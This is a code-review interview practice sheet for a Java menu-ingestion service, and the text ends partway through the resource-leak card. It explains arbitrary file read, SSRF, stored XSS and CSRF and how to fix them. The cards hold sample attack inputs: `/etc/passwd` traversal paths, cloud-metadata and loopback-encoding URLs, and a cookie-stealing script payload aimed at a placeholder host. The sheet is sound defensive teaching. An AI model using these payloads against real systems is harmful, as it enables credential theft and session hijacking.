# Toast Code Review Round: MenuDataResource Practice Sheet

**Format (1 hr):** read-only code. Find functional bugs, memory issues, and slow code or bad design.
For every issue, explain **Root cause → Production impact → Fix**.

**Files:**
- `MenuDataResource.java`: the original code under review (line numbers below refer to it).
- `MenuDataResourceFix.java`: the complete fixed version. Tags like `[S1]` and `[R3]` in its comments match the issue ids here.

---

## 0. How to practise with this sheet

1. **Cold read (30 min):** open only `MenuDataResource.java`, set a timer, and write down every issue you find. Don't look below.
2. **Score yourself** against the issue index in §4. Anything you missed goes into a "missed" list.
3. **Narrate out loud:** for each issue, say the RCA in the §2 format *without reading*. Record yourself if you can. Aim for 45–60 seconds per major issue.
4. **Write the fix by hand** for the top 6 (S1, S2, R1/R2, R3, R4, P1), then compare with `MenuDataResourceFix.java`.
5. **Drill the follow-ups:** read each question, answer out loud, then open the `<details>` block to check.
6. **Full mock:** do §9 (mock-interview script) end to end in 60 minutes.

---

## 1. How to run the hour

| Time | What to do | What to say |
|---|---|---|
| 0–5 min | Skim all 4 files, read the Javadoc and the routes. Ask clarifying questions. | "Before diving in, a few questions: is this public-facing? How big are menus, and how many rows do we expect? Who consumes this data?" |
| 5–10 min | State your plan. | "I'll trace each endpoint end to end, from resource to Reader, DAO and entity, flag issues as I go, then rank them by severity at the end." |
| 10–40 min | Walk each endpoint and narrate the issues (§3). | RCA format, §2 |
| 40–50 min | Design improvements + test gaps. | "If I were rebuilding this…" |
| 50–60 min | Recap the **top 5 by severity**, take follow-ups. | §10 summary |

**File reading order:** Intent (Javadoc) → Resource endpoints → follow the calls down (Reader → `loadByes` → DAO → Entity) → Tests last.

**Reporting order (severity):** Security → Correctness → Reliability / leaks → Performance / memory → Design → Tests → Style.

> Don't open with the `<list>` tag or a typo. Open with the attack chain; it shows you know what matters in production.

### Clarifying questions worth asking (and why)
| Question | Why it matters to your answer |
|---|---|
| Is this exposed to the internet or internal only? | Raises or lowers the severity of S1–S4 (they're still bugs internally, because of SSRF pivots) |
| Typical / max menu size? | Size cap, `@Lob`, whether blobs belong in the DB at all |
| How many rows over time? | `findAll` severity, pagination design |
| Who consumes `GET /{id}` and `GET /`? A browser or a service? | HTML vs JSON, XSS severity |
| Is the `loadFile` endpoint really needed? | The best fix for S1 is deleting it |
| Sync response required, or can ingestion be async? | 201 vs 202 + job design |

---

## 2. The narration framework (how to explain an RCA)

Use the same 6 beats for every issue. Interviewers grade **structure** as much as content.

| Beat | Question it answers | Phrase to start with |
|---|---|---|
| 1. **Where / what** | Which line, what does it do? | "On line 112, `loadFile` passes the `location` query param straight into `Files.readAllBytes`…" |
| 2. **Root cause** | *Why* is it wrong? (the design flaw, not the symptom) | "The root cause is that we treat a server file path as trusted user input; there's no allowlist or base directory." |
| 3. **Trigger / repro** | How does it actually happen? | "Concretely, `GET /common/loadFile?location=/etc/passwd`…" |
| 4. **Production impact** | Who's hurt, how badly, how widely, how would we notice? | "That gives anyone full read access to the box, including `config.yml` with DB credentials. It's a P0." |
| 5. **Fix** | Immediate fix + proper long-term fix | "Short term I'd remove the endpoint. If it must exist…" |
| 6. **Verify / prevent** | How do we prove it and stop it recurring? | "I'd add a test that `../../etc/passwd` returns 400, and a lint rule / review checklist item…" |

### Impact vocabulary (use these words)
- **Blast radius:** one request / one user / the whole service / other services (shared DB pool) / the whole cloud account (SSRF to metadata credentials).
- **Severity:** P0 = security breach or data loss, P1 = outage or wrong data, P2 = degraded performance / bad UX, P3 = maintainability.
- **Detectability:** silent (worst: wrong data with a 200), noisy (500s, alerts), latent (fine today, breaks at scale).
- **Likelihood:** needs an attacker / happens with normal traffic / happens only at scale.

### Template you can memorise
> "On **line X**, **[what the code does]**. The root cause is **[design flaw]**. So if **[trigger]**, then **[immediate effect]**, which in production means **[business impact + blast radius]**. I'd rate it **[P-level]**. To fix it, **[short-term]**, and properly **[long-term]**. I'd verify with **[test]**."

### Common mistakes
- Describing the symptom ("it returns null") without the root cause ("errors are swallowed in a catch-all").
- Saying "this is bad" without impact. Always add *what happens in production*.
- Listing 30 nits at the same level. **Rank** them, and say explicitly "this one is the most important".
- Fixing only the instance and not the class of bug ("this line leaks" vs "nothing in this class uses try-with-resources").

---

## 3. Walking the code: annotated map of the original

| Lines | Code | Issues |
|---|---|---|
| 26–32 | Javadoc "by any means necessary", "allow everyone and everything" | S4 (requirements smell), D5 |
| 48–61 | `GET /loadFile` with `@UnitOfWork` | S1, S5, C2, C4 |
| 63–73 | `GET /loadUrl` with `@UnitOfWork` | S2, S5, R3, C2 |
| 75–90 | `GET /` → `list()` builds HTML | S3, C5, P1, P2, P4 |
| 82 | `dao.findAll()` | P1 |
| 85 | `"<a href="+ id +">" + locator` | S3, C5 |
| 92–103 | `GET /{id}` → `get()` | C3, C9, P2 |
| 105–140 | static `Reader.retrieve` with a `switch` | D1 |
| 106 | `private static Logger logger` (JUL, not final) | D4 |
| 112 | `Files.readAllBytes(Paths.get(locator))` | S1, R4 |
| 115–117 | `new URL(locator).openConnection().getInputStream()` | S2, R1, R2 |
| 118–129 | read loop into `ByteArrayOutputStream` | R4 |
| 135–138 | `catch (IOException) { log; return null; }` | C1 |
| 142–148 | `loadByes`: creates the entity, always `return true` | C2, P3, D4 |
| 168 | `private long id` (primitive) | C8 |
| 170–171 | `byte[] bytes` without `@Lob` | C7 |
| 179–181 | `MenuData(byte[])` constructor, no locator | C8 |
| 207–226 | `equals`/`hashCode` on id + `byte[]` | C6 |
| 254–257 | raw `org.hibernate.Query`, unchecked cast, no paging | P1, D4 |
| 273–283 | `ReaderTest` | T1–T4 |

---

## 4. Issue index (score yourself here)

| Id | Sev | Issue |
|---|---|---|
| S1 | P0 | Arbitrary file read via `loadFile` + exfiltration via `GET /{id}` |
| S2 | P0 | SSRF via `loadUrl` (metadata creds, internal services, `file:`/`jar:`, redirects) |
| S3 | P1 | Stored XSS in `list()` |
| S4 | P1 | No authN / authZ / rate limiting; we can be used as an attack proxy |
| S5 | P1 | State-changing `GET` |
| C1 | P1 | `retrieve` swallows `IOException` → `null` → constraint violation → 500 |
| C2 | P1 | `loadByes` always `true`; `"error!"` is dead code; no real status codes |
| C3 | P2 | `RuntimeException("Error 404")` → actually a 500 |
| C4 | P2 | No input validation (null / blank / huge `location`) |
| C5 | P3 | Broken HTML: relative unquoted `href`, `<list>` instead of `<ul>` |
| C6 | P2 | `equals`/`hashCode` use `byte[]` (reference) + mutable generated id |
| C7 | P1 | `byte[]` without `@Lob` → `VARBINARY(255)` → truncation / insert failure |
| C8 | P3 | primitive `long id`; constructor that builds an invalid entity |
| C9 | P2 | `get()` serves arbitrary bytes as `text/plain`; no content type stored |
| R1 | P1 | `InputStream` / connection never closed → socket + FD leak |
| R2 | P0/P1 | No timeouts → Jetty threads pinned forever → service-wide outage |
| R3 | P0/P1 | `@UnitOfWork` holds a DB connection during the network fetch → DB pool exhausted |
| R4 | P1 | Unbounded reads → OOM (2–3× payload peak) |
| P1 | P1 | `findAll()` loads every row + every blob just to print id + locator |
| P2 | P3 | Read endpoints use full read-write transactions |
| P3 | P2 | No dedupe: same menu stored N times |
| P4 | P3 | String concatenation inside `StringBuilder.append` |
| D1 | – | Static `Reader` + `switch` on enum → Strategy + DI |
| D2 | – | Blobs in the RDBMS → object storage (S3) |
| D3 | – | Synchronous fetch inside the request → async job |
| D4 | – | Raw Hibernate `Query`, JUL logger, `loadByes` typo, table name `RETRIEVED_DATA` |
| D5 | – | "By any means necessary": robots.txt / ToS / legal, User-Agent |
| T1–T4 | – | Tests: real network, temp file leak, default charset, doesn't compile, no negative cases |

---

## 5. Issue cards: narration, impact, fix, follow-ups

> For each card: practise the **Say it** paragraph out loud. The code is the fix you'd sketch on the whiteboard; the full version is in `MenuDataResourceFix.java`.

---

### 🔴 S1: Arbitrary file read (lines 48–61, 112)

**Say it:**
> "The most severe issue is in `loadFile`. On line 112 it calls `Files.readAllBytes(Paths.get(locator))` where `locator` comes straight from the query string, with no validation and no auth. The root cause is that a **server filesystem path is treated as user input**: there's no allowlist or base directory. So anyone can call `GET /common/loadFile?location=/etc/passwd`, or better for an attacker, our Dropwizard `config.yml`, which holds the DB password. The bytes are saved to the DB, and `GET /common/{id}` hands them back. So it's an **arbitrary file read with a built-in exfiltration channel**: a P0. If this were deployed, I'd treat it as a security incident: check access logs for `loadFile` calls and **rotate any secrets** that were readable. The best fix is to **delete the endpoint**: clients shouldn't know about our filesystem, and if they need to send us a menu they can upload it. If it really must exist for internal batch imports, I'd confine it to a configured import directory, resolve with `toRealPath()` so `..` and symlinks can't escape, check `startsWith(baseDir)`, cap the size, and put it behind an admin role. I'd prove it with tests for `../../etc/passwd`, an absolute path, and a symlink pointing outside."

**Production impact:** credentials leak → DB compromise → full data breach. Blast radius: everything the service account can read (`/proc/self/environ` exposes env-var secrets too).

**Fix:**
```java
// Option A (preferred): remove loadFile; accept an upload instead
@POST @Path("/upload") @Consumes(MediaType.MULTIPART_FORM_DATA)
public Response upload(@FormDataParam("file") InputStream file) { ... bounded read, same pipeline ... }

// Option B: confine to an import dir
static Path resolveInside(Path realBaseDir, String locator) {
    Path real;
    try {
        real = realBaseDir.resolve(locator).normalize().toRealPath();   // ".." removed, symlinks followed
    } catch (IOException | InvalidPathException e) {
        throw new MenuFetchException(INVALID_LOCATOR, "file not allowed");
    }
    if (!real.startsWith(realBaseDir) || !Files.isRegularFile(real)) {  // Path.startsWith = per component
        throw new MenuFetchException(INVALID_LOCATOR, "file not allowed"); // same message: no existence oracle
    }
    return real;
}
```

**Test:**
```java
@ParameterizedTest
@ValueSource(strings = {"../../etc/passwd", "/etc/passwd", "sub/../../secret.txt", "link-to-outside"})
void rejectsPathsOutsideImportDir(String locator, @TempDir Path tmp) throws IOException {
    Path base = Files.createDirectories(tmp.resolve("import"));
    Files.writeString(tmp.resolve("secret.txt"), "s3cret");
    Files.createSymbolicLink(base.resolve("link-to-outside"), tmp.resolve("secret.txt"));
    FileMenuSource source = new FileMenuSource(base, 1024);
    MenuFetchException e = assertThrows(MenuFetchException.class, () -> source.fetch(locator));
    assertEquals(Kind.INVALID_LOCATOR, e.getKind());
}
```

**Follow-up questions:**
<details><summary>Why not just reject strings containing ".."?</summary>

Blocklists miss variants: absolute paths (`/etc/passwd` has no `..`), symlinks inside the allowed dir pointing out, URL-encoded `%2e%2e`, Windows `..\`, and Unicode tricks. Canonicalise first (`toRealPath`), then check containment. That's an allowlist on the *final* path.
</details>
<details><summary>Why `toRealPath()` and not just `normalize()`?</summary>

`normalize()` is purely lexical: it removes `.`/`..` but doesn't touch the filesystem, so a symlink `import/evil -> /etc` still passes. `toRealPath()` resolves symlinks against the real filesystem. It also throws if the file doesn't exist, which we map to the same "not allowed" error.
</details>
<details><summary>Why `Path.startsWith` and not `String.startsWith`?</summary>

`"/data/import-evil".startsWith("/data/import")` is true for strings. `Path.startsWith` compares whole name components, so it's false. A classic bug.
</details>
<details><summary>Is there still a race (TOCTOU)?</summary>

Yes, in theory: the file could be swapped for a symlink between the check and the open. Mitigations: nobody untrusted can write to the import dir, open with `LinkOption.NOFOLLOW_LINKS`, or on Linux use `openat`-style APIs. In practice, removing the endpoint is the real answer.
</details>
<details><summary>Why return the same error for "missing" and "forbidden"?</summary>

Otherwise the endpoint becomes an oracle: an attacker learns which files exist on the server (e.g. which config files, which users' home directories).
</details>
<details><summary>What would you do right now if this is in production?</summary>

Incident response: disable the endpoint (feature flag / WAF rule), search access logs for `loadFile` with suspicious paths, check the `RETRIEVED_DATA` table for rows whose locator isn't a menu, delete them, rotate DB creds and any API keys in config/env, and write a post-mortem.
</details>

---

### 🔴 S2: SSRF in `loadUrl` (lines 63–73, 115–117)

**Say it:**
> "`loadUrl` has the same root cause on the network side: on line 115 it does `new URL(locator).openConnection()` with a URL from the user. That's **Server-Side Request Forgery**: our server makes requests on the attacker's behalf, from *inside* our network. The worst case is `http://169.254.169.254/latest/meta-data/iam/security-credentials/` on AWS, which returns temporary IAM credentials for our instance role. We store the response and `GET /{id}` gives it back, so the attacker walks away with cloud credentials. They can also hit internal admin endpoints, the Dropwizard admin port, or other internal services, and since `java.net.URL` supports `file:` and `jar:`, this endpoint is *also* a file read. P0. The fix: only allow http/https, resolve the hostname and **reject private, loopback and link-local IPs**, disable automatic redirects and **re-validate every hop**, and restrict ports. Defence in depth: send the traffic through an egress proxy that only allows the public internet, and enforce IMDSv2 on the instances."

**Production impact:** cloud account compromise (metadata creds), internal service access, port scanning of the internal network, and file read via `file:`.

**Fix:**
```java
static URI parseHttpUri(String locator) {
    URI uri = new URI(locator.trim());                          // (URISyntaxException → 400)
    String scheme = uri.getScheme() == null ? "" : uri.getScheme().toLowerCase(Locale.ROOT);
    if (!scheme.equals("http") && !scheme.equals("https")) throw invalid("only http/https");  // blocks file:, jar:, gopher:
    if (uri.getHost() == null || uri.getRawUserInfo() != null) throw invalid("bad host");
    if (uri.getPort() != -1 && uri.getPort() != 80 && uri.getPort() != 443) throw invalid("port not allowed");
    return uri;
}

static void checkHost(URI uri, Predicate<InetAddress> allowed) {
    for (InetAddress a : InetAddress.getAllByName(uri.getHost()))   // check the RESOLVED IPs, every one of them
        if (!allowed.test(a)) throw invalid("destination not allowed");
}

static boolean isPublicAddress(InetAddress a) {
    if (a.isAnyLocalAddress() || a.isLoopbackAddress() || a.isLinkLocalAddress()   // 0.0.0.0, 127/8, 169.254/16
            || a.isSiteLocalAddress() || a.isMulticastAddress()) return false;      // 10/8, 172.16/12, 192.168/16
    byte[] b = a.getAddress();
    if (a instanceof Inet4Address)
        return b[0] != 0 && !((b[0] & 0xff) == 100 && (b[1] & 0xff) >= 64 && (b[1] & 0xff) <= 127); // 0/8, CGNAT
    return (b[0] & 0xfe) != 0xfc;                                                    // IPv6 fc00::/7
}

// in the fetch loop:
conn.setInstanceFollowRedirects(false);
for (int hop = 0; hop <= MAX_REDIRECTS; hop++) {
    SsrfGuard.checkHost(uri, addressAllowed);                   // re-check on EVERY redirect hop
    ...
    if (status >= 300 && status < 400) { uri = parseHttpUri(uri.resolve(location).toString()); continue; }
}
```

**Test:**
```java
@ParameterizedTest
@ValueSource(strings = {
    "file:///etc/passwd", "jar:file:/app.jar!/config.yml", "ftp://x.com/a",
    "http://169.254.169.254/latest/meta-data/", "http://localhost:8081/tasks", "http://127.1/",
    "http://[::1]/", "http://[::ffff:127.0.0.1]/", "http://10.0.0.5/", "http://2130706433/",
    "http://user:pw@example.com/", "http://example.com:22/"})
void blocksDangerousUrls(String url) {
    assertThrows(MenuFetchException.class, () -> new UrlMenuSource(SsrfGuard::isPublicAddress, 1024).fetch(url));
}

@Test void reValidatesRedirects() {   // WireMock: /menu → 302 Location: http://169.254.169.254/
    stubFor(get("/menu").willReturn(temporaryRedirect("http://169.254.169.254/")));
    UrlMenuSource source = new UrlMenuSource(a -> a.isLoopbackAddress(), 1024);  // test policy: allow only WireMock
    assertThrows(MenuFetchException.class, () -> source.fetch(wireMock.url("/menu")));
}
```

**Follow-up questions:**
<details><summary>Why not just blocklist the string "169.254.169.254" or "localhost"?</summary>

Too many encodings: `http://2130706433/` (decimal), `http://0x7f.1/`, `http://127.1/`, `http://[::ffff:127.0.0.1]/`, a DNS name like `metadata.attacker.com` that resolves to 169.254.169.254, or a public URL that **redirects** to it. The only robust check is on the *resolved IP address*, on every hop.
</details>
<details><summary>What is DNS rebinding and does your fix handle it?</summary>

The attacker's DNS returns a public IP when we validate, then a private IP (TTL 0) when `HttpURLConnection` resolves again to connect. My check is time-of-check vs time-of-use, so it's **not fully** protected. Complete fixes: connect to the IP we validated (pin it, sending the Host header / SNI for the original name), or route all fetches through an **egress proxy** (e.g. Smokescreen) that does the IP check at connect time. Plus network-level controls: security groups / NetworkPolicy denying egress to private ranges.
</details>
<details><summary>Allowlist vs blocklist of destinations?</summary>

If the set of menu providers is known (partners), an allowlist of domains is far safer. For "all the menus in the world" an allowlist isn't feasible, so: block private ranges + egress proxy + monitoring.
</details>
<details><summary>What is IMDSv2 and why mention it?</summary>

AWS Instance Metadata Service v2 requires a `PUT` to get a session token, plus a header on every request, with a hop limit of 1. A simple SSRF `GET` can't get credentials. It's defence in depth: the app should still block it.
</details>
<details><summary>Why restrict ports?</summary>

To stop the service being used as a port scanner (response-time differences reveal open ports) and to keep it off non-HTTP services (Redis, SMTP) via protocol smuggling.
</details>
<details><summary>Could our service be used to attack *other* people?</summary>

Yes. With no auth or rate limit, an attacker can make us flood a third-party site (we become a DDoS proxy, and the traffic comes from our IPs). Fix: per-destination-host rate limits, global concurrency caps, auth.
</details>

---

### 🟠 S3: Stored XSS in `list()` (line 85)

**Say it:**
> "In `list()`, line 85 concatenates `menuData.getLocator()` directly into HTML. The locator is attacker-controlled: it's whatever they passed to `loadUrl`. So `loadUrl?location=http://x.com/"><script>fetch('//evil?c='+document.cookie)</script>` gets stored, and **every** user who opens the list page runs that script. It's stored XSS, the persistent kind, which hits everyone, including admins. The root cause is building HTML by string concatenation with no output encoding. Fix: return JSON and let the front end render it, or use a template engine that auto-escapes. If we keep the hand-built HTML, escape every value and quote the attributes. I'd add a CSP header as defence in depth."

**Fix:**
```java
// Preferred: JSON API (no HTML at all)
@GET @Produces(MediaType.APPLICATION_JSON) @UnitOfWork(readOnly = true)
public MenuSummaryPage list(@QueryParam("afterId") @DefaultValue("0") long afterId, ...) { ... }

// If HTML must stay:
html.append("<li>").append(s.getId()).append(" :: <a href=\"")
    .append(Html.escape(href.toString())).append("\">")
    .append(Html.escape(s.getLocator()))
    .append("</a></li>");

static String escape(String s) {   // & < > " '  (real code: OWASP Encoder Encode.forHtml / forHtmlAttribute)
    ...
}
```

**Follow-up questions:**
<details><summary>Is HTML-escaping enough for a value inside href?</summary>

No. Escaping stops breaking out of the attribute, but `href="javascript:alert(1)"` contains no special characters at all. For URLs in `href` you also validate the **scheme** (allow only http/https). Here the href is built from a numeric id, so it's safe; only the link text is user data. Contexts matter: HTML body, attribute, URL, JS and CSS each need different encoding.
</details>
<details><summary>What does Content-Security-Policy add?</summary>

`Content-Security-Policy: default-src 'self'; script-src 'self'` blocks inline scripts even if escaping is missed somewhere. It's defence in depth, not a replacement.
</details>
<details><summary>Should you sanitise on input or escape on output?</summary>

Escape on **output**, in the context where the data is used. Input validation (rejecting non-URLs) helps, but the same data may be rendered in HTML, JSON, CSV or logs, and each needs different encoding.
</details>

---

### 🟠 S4: No authentication / authorization / rate limiting (Javadoc lines 26–32)

**Say it:**
> "The Javadoc says 'we allow everyone and everything'. I'd push back on that requirement. Even if ingestion is meant to be open, write endpoints with no auth or rate limit mean anyone can fill our DB, run up our bandwidth bill, and use us as an attack proxy against S1 and S2. I'd require auth (API keys or OAuth for partners, `@RolesAllowed("menu-ingest")`), rate limit per key at the gateway, and cap concurrent fetches per destination host."

**Fix:** `@RolesAllowed("menu-ingest")` on the resource + Dropwizard `AuthDynamicFeature` / `RolesAllowedDynamicFeature`; a token bucket per API key at the gateway (or Redis-backed for multiple instances); per-host fetch limits.

**Follow-up questions:**
<details><summary>Where would you implement rate limiting?</summary>

At the edge (API gateway / load balancer) for per-client limits. That's cheap, and it's centralised across instances. In the app, add a **bulkhead** (a semaphore capping concurrent fetches) so a burst can't take all the threads. For multiple instances that need a shared counter, use Redis (`INCR` + `EXPIRE`, or a token bucket in Lua).
</details>
<details><summary>Token bucket vs fixed window?</summary>

A fixed window allows 2× bursts at the window boundary. A token bucket allows controlled bursts up to the bucket size and a smooth average rate. A sliding-window log is exact but needs more memory.
</details>

---

### 🟠 S5: State-changing `GET` (lines 48, 63)

**Say it:**
> "Both `loadFile` and `loadUrl` are `GET`s, but they insert rows. GET is supposed to be **safe and idempotent**. Crawlers, link prefetchers, browser preloading and CDN caches will trigger them. A malicious page can embed `<img src="https://us/common/loadUrl?location=...">` and every visitor's browser fires the request (CSRF). Retries by proxies create duplicates. Fix: `POST` with a JSON body, `201 Created` + `Location` header."

**Fix:**
```java
@POST @Consumes(MediaType.APPLICATION_JSON)
public Response create(@NotNull @Valid CreateMenuSourceRequest req, @Context UriInfo uriInfo) {
    ...
    URI location = uriInfo.getAbsolutePathBuilder().path(String.valueOf(saved.getId())).build();
    return Response.created(location).entity(MenuSummary.of(saved)).build();
}
```

**Follow-up questions:**
<details><summary>Changing GET to POST breaks existing clients. How do you roll it out?</summary>

Add the new `POST /menu-sources` alongside the old one, mark the old one deprecated (a `Deprecation`/`Sunset` header), add metrics on who still calls it, notify the consumers, then remove it. For the security issues (S1/S2), though, don't wait: lock down the old endpoint immediately.
</details>
<details><summary>POST isn't idempotent. What if the client retries after a timeout?</summary>

Accept an `Idempotency-Key` header (store key → result, return the same result on retry), or make the operation naturally idempotent: here, dedupe by content hash (P3) so a retry returns the existing row.
</details>

---

### 🟠 C1: Errors swallowed → `null` → 500 (lines 135–138)

**Say it:**
> "`retrieve` catches every `IOException`, logs it at SEVERE and returns `null`. The caller doesn't check, so `loadByes` does `setBytes(null)` and persists. The column is `nullable = false`, so Hibernate throws a constraint violation and the client gets a generic 500. The root cause is **swallowing exceptions and using null as an error signal**. The impact: every bad URL, timeout or missing file looks like *our* bug, it pages on-call, and the client gets no useful message. Fix: let typed exceptions propagate, and map them to 400 for a bad locator, 413 for too large, 502 when upstream fails and 504 on timeout."

**Fix:**
```java
public static class MenuFetchException extends RuntimeException {
    public enum Kind { INVALID_LOCATOR, TOO_LARGE, TIMEOUT, UPSTREAM_FAILED }
    ...
}

@Provider
public static class MenuFetchExceptionMapper implements ExceptionMapper<MenuFetchException> {
    public Response toResponse(MenuFetchException e) {
        int status;
        switch (e.getKind()) {
            case INVALID_LOCATOR: status = 400; break;
            case TOO_LARGE:       status = 413; break;
            case TIMEOUT:         status = 504; break;
            default:              status = 502; break;
        }
        return Response.status(status).type(APPLICATION_JSON)
                .entity(Map.of("error", e.getKind().name(), "message", e.getMessage())).build();
    }
}
```

**Follow-up questions:**
<details><summary>Why not a checked exception?</summary>

Either is defensible. Checked forces handling at every layer, which in JAX-RS mostly means re-throwing. A runtime exception plus one `ExceptionMapper` keeps the resource code clean and the mapping in one place. The key thing is that it's **typed**, not a `null`.
</details>
<details><summary>Why is logging at SEVERE with a stack trace a problem here?</summary>

These are mostly *client* errors. An attacker can generate unlimited SEVERE logs (log flooding, storage cost, alert fatigue), and real problems get buried. Log 4xx at INFO without the stack trace, and 5xx at WARN/ERROR.
</details>
<details><summary>Why 502 vs 504 vs 500?</summary>

500 = our bug. 502 Bad Gateway = the upstream gave a bad response. 504 Gateway Timeout = the upstream didn't respond in time. Distinguishing them tells on-call and the client whether to retry and whose fault it is.
</details>

---

### 🟠 C2: Always "success" (lines 56–60, 142–148)

**Say it:**
> "`loadByes` unconditionally returns `true`, so the `"error!"` branch is dead code, and every call returns HTTP 200 with the string `success!`, even when nothing was stored. Worse, the transaction commits *after* the method returns, so a commit failure can't be reported in the body either. Clients can't tell success from failure without parsing text. The root cause is using a boolean + string instead of HTTP semantics. Fix: return `201 Created` with the id and a `Location` header; failures come from exceptions (C1)."

<details><summary>Follow-up: "success!" was returned, but could the row still not exist?</summary>

Yes. With `@UnitOfWork`, the commit happens after the resource method returns. A constraint violation at flush/commit time turns into a 500. Also, `IDENTITY` generation forces an immediate insert on `persist`, but other strategies defer the insert to flush. Never claim success before the commit.
</details>

---

### 🟡 C3: 404 becomes 500 (lines 98–100)

**Say it:**
> "`get()` throws `new RuntimeException("Error 404 Not Found")`. The message says 404, but JAX-RS maps any unhandled RuntimeException to **500**. So a typo in an id looks like a server error, triggers alerts, and clients may retry pointlessly. Fix: `orElseThrow(NotFoundException::new)`."

```java
MenuData data = dao.findById(id).orElseThrow(() -> new NotFoundException("menu source " + id));
```

<details><summary>Follow-up: what happens if someone calls GET /common/abc?</summary>

The `Long` path param can't be converted, so JAX-RS returns 404 itself before the method runs. That's fine. Negative ids just return 404 from the lookup.
</details>

---

### 🟡 C4: No input validation (lines 51–54)

**Say it:**
> "There's no validation anywhere; the author even left a note at line 52. A missing `location` gives `Paths.get(null)` → NPE → 500. On the URL path, `new URL(null)` throws `MalformedURLException`, which is swallowed into null and then a constraint violation. A 1 MB location string gets stored as-is. Fix: Bean Validation on a request DTO, `@NotNull` type and `@NotBlank @Size(max=2048)` location, so Dropwizard returns 422 automatically before our code runs."

```java
public static class CreateMenuSourceRequest {
    @NotNull private SourceType type;
    @NotBlank @Size(max = 2048) private String location;
}
public Response create(@NotNull @Valid CreateMenuSourceRequest request, ...)
```

<details><summary>Follow-up: what status does Dropwizard return for a validation failure?</summary>

422 Unprocessable Entity, with a JSON list of violations, via its built-in `JerseyViolationExceptionMapper`. For query params with `@Min`/`@Max` it's 400.
</details>

---

### 🟡 C5: Broken HTML (lines 81, 85, 88)

**Say it (keep it short, it's low severity):**
> "Smaller things in the HTML: `<list>` isn't an HTML element, it should be `<ul>`, because `<li>` needs a `<ul>` or `<ol>` parent. The `href` is unquoted and relative, `href=5`: from `/common` without a trailing slash, the browser resolves that to `/5`, which is the wrong path. Quote it and make it absolute, `/common/5`. All of this goes away with JSON or a template engine, which is the same fix as the XSS."

---

### 🟡 C6: `equals` / `hashCode` (lines 207–226)

**Say it:**
> "The entity's `equals` uses `Objects.equals(this.bytes, that.bytes)`, which for arrays compares **references**, so two entities with identical content are never equal. `hashCode` uses `Objects.hash(id, bytes, locator)`, which uses the array's identity hash. And it includes the generated `id`, which is 0 before `persist` and N after. So if you put a new entity in a `HashSet`, then persist it, its hash changes and `set.contains(entity)` returns **false**: the object is lost in its own set. Hibernate's own collections and the persistence context rely on sane equality. Fix: equality by the database id when non-null, and a constant `hashCode`. If you need content equality, use `Arrays.equals`, but entities shouldn't compare large blobs."

```java
@Override public boolean equals(Object o) {
    if (this == o) return true;
    if (!(o instanceof MenuData)) return false;            // instanceof, not getClass(): works with Hibernate proxies
    MenuData that = (MenuData) o;
    return id != null && id.equals(that.getId());          // getId(): a proxy's fields aren't populated
}
@Override public int hashCode() { return MenuData.class.hashCode(); }  // stable across persist
```

**Follow-up questions:**
<details><summary>A constant hashCode makes every entity collide. Isn't that O(n) in a HashSet?</summary>

Yes, all entities land in one bucket (Java 8+ turns it into a tree for Comparable keys, otherwise a list). It's an accepted trade-off because entity sets in one persistence context are small, and correctness across the transient → persistent transition matters more. The alternative is a **natural/business key** or a UUID assigned in the constructor, which gives a stable, well-distributed hash from birth.
</details>
<details><summary>Why `getId()` instead of `that.id`?</summary>

`that` may be a Hibernate lazy proxy (a generated subclass). Its fields are null; only the getters delegate to the real object.
</details>
<details><summary>Why not Lombok `@Data` / `@EqualsAndHashCode`?</summary>

It reproduces the exact bug (all fields, including the mutable id and collections). On lazy associations it can also trigger loads or `LazyInitializationException`, and `@ToString` can recurse forever on bidirectional relations.
</details>

---

### 🟠 C7: `byte[]` without `@Lob` (lines 170–171)

**Say it:**
> "`byte[] bytes` has `@Column` but no `@Lob` and no length. Hibernate's default mapping for `byte[]` is `VARBINARY(255)`/`BINARY VARYING(255)`. So any menu over 255 bytes, which is basically all of them, either **fails the insert or gets silently truncated**, depending on the DB and SQL mode. Silent truncation is the worst case: the service says success and the data is corrupt. Fix: `@Lob` (or an explicit length / column definition), and long term move blobs out of the DB entirely (D2)."

```java
@Lob @Basic(fetch = FetchType.LAZY)
@Column(name = "BYTE_DATA", nullable = false)
private byte[] bytes;
```

<details><summary>Follow-up: any DB-specific gotchas with @Lob?</summary>

On PostgreSQL, `@Lob byte[]` maps to `oid` (large-object storage, which needs explicit cleanup or it leaks storage via orphaned large objects), not `bytea`. Many teams use `@Column(columnDefinition = "bytea")` without `@Lob` on Postgres. MySQL: `@Lob` → `LONGBLOB`; also check `max_allowed_packet`.
</details>
<details><summary>Follow-up: does `@Basic(fetch = LAZY)` stop Hibernate loading the blob?</summary>

Only with **bytecode enhancement** enabled. Without it, Hibernate ignores lazy on basic attributes and loads the blob anyway. That's why `list()` uses a projection, or you put the blob in a separate entity/table with a lazy `@OneToOne`.
</details>

---

### 🟡 C8: primitive id + half-built constructor (lines 168, 179–181)

**Say it:**
> "`id` is a primitive `long`, so 'not persisted yet' looks like id 0, while the DAO uses `Long`. Use `Long`, where null means transient. And the `MenuData(byte[])` constructor builds an entity with a null locator, which violates `nullable = false`. Remove it and have one constructor that builds a complete, valid object."

---

### 🟡 C9: `get()` serves arbitrary bytes as text/plain (lines 92–103)

**Say it:**
> "`get()` returns raw bytes labelled `text/plain`. We never stored the real content type, so a PDF menu or an image is mislabelled. Older browsers do content sniffing and could render an attacker's HTML. Fix: store the upstream `Content-Type` at fetch time, serve it back with `X-Content-Type-Options: nosniff` and `Content-Disposition: attachment`. With blobs in S3, redirect to a short-lived pre-signed URL instead of streaming through our service."

```java
return Response.ok(data.getBytes(), data.getContentType())
        .header("X-Content-Type-Options", "nosniff")
        .header("Content-Disposition", "attachment")
        .build();
```

---

### 🔴 R1: Stream and connection leak (lines 115–117)

**Say it:**
> "On line 117 `conn.getInputStream()` is opened but never closed, there's no try-with-resources, and no `disconnect()`. On the success path the socket stays open until GC eventually finalises it; on the exception path it's definitely leaked. Under load each leaked socket holds a file descriptor, until we hit the process limit and get **'Too many open files'**. At that point we can't accept connections or open DB connections either: a full outage that looks unrelated to this code. The root cause is no resource management. Fix: try-with-resources plus `disconnect()` in `finally`."

```java
HttpURLConnection conn = open(uri);
try {
    ...
    try (InputStream in = conn.getInputStream()) {        // closed on every path
        return FetchedContent.of(BoundedRead.readAtMost(in, maxBytes, deadline), ...);
    }
} finally {
    conn.disconnect();
}
```

**Follow-up questions:**
<details><summary>How would you detect an FD leak in production?</summary>

The `process_open_fds` metric (or `lsof -p <pid> | wc -l`) climbing steadily; many sockets in `CLOSE_WAIT` in `netstat`/`ss`; finally, `IOException: Too many open files` in the logs. Alert on open FDs as a percentage of `ulimit -n`.
